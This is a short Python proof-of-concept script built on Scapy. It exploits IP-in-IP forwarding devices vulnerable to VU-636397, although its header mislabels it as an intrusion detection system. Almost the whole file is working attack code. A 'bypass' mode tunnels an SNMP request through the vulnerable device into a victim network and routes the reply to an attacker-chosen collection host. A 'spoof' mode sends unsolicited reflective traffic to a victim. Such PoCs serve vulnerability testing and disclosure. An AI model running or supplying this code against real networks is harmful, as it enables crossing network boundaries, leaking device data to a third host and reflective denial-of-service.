# Intrusion-Detection-System
#detect network vulnerability by ip filtering
#!/usr/bin/env python3
#PoC Script
#PoC script slightly modified to test bypass mode
import sys
from scapy.all import *
if len(sys.argv) < 3:
  print("Usage "+sys.argv[0]+" VULNERABLE_MACHINE_IP VICTIM_IP [DATA_COLLECT_IP] [spoof|bypass]")
  print("\t - Optional arguments DATA_COLLECT_IP and bypass can be used to test bypass NAT")
  sys.exit(0);
  ## IP-in-IP forwarding device vulnerable to VU-636397
VULNERABLE_MACHINE_IP = sys.argv[1]
## VICTIM IP of the machine we want to send packet to
VICTIM_IP = sys.argv[2]

if len(sys.argv) == 5 and sys.argv[4] == "bypass":
  ## Address we want to send the return traffic back to 
  DATA_COLLECT_IP = sys.argv[3]
  ## LAN bypass mode to jump into VICTIM_IP network
  ## send IP over IP (proto 4) to pull sys.descr from VICTIM_IP and send to DATA_COLLECT_IP
  send(IP(dst=VULNERABLE_MACHINE_IP)/IP(src=DATA_COLLECT_IP,dst=VICTIM_IP)/UDP(sport=3364)/
       SNMP(community="public",PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1.0"))])))
else:
  ## spoof mode to spoof vulnerable device to send unsolicited traffic to VICTIM_IP 
  ## send unsolicited reflective DOS traffic to VICTIM_IP on port 3364 saying "I am Vulnerable"
  send(IP(dst=VULNERABLE_MACHINE_IP)/IP(src=VULNERABLE_MACHINE_IP, dst=VICTIM_IP)/UDP(sport=3364, dport=3364)/
       Raw(load="I am Vulnerable\n"))
  ## To see the packets in the DATA_COLLECTOR or VICTIM_IP execute:
  ## tcpdump -i any -nvvv udp port 3364
